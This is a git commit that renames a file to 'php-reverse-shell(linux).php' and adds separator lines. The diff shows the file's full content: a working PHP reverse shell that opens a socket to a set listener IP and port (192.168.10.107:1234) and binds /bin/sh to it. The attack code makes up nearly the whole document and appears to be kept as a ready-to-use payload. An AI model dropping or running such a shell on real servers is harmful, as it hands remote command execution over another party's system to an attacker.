6178be0fe4d9326568dc65336c0a16efa9b0610e
Saide Hossain <saide2328@gmail.com>
2025-02-18 20:52:53 +0600

    Update and rename php-reverse-shell.php to php-reverse-shell(linux).php

--- php-reverse-shell(linux).php
+++ php-reverse-shell(linux).php
@@ -1,6 +1,8 @@
+----------------------------
 <?php
 $ip = '192.168.10.107'; // Change this to your listening IP
 $port = 1234; // Change this to your listening port
 $sock = fsockopen($ip, $port);
 $proc = proc_open('/bin/sh', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
 ?>
+-----------------
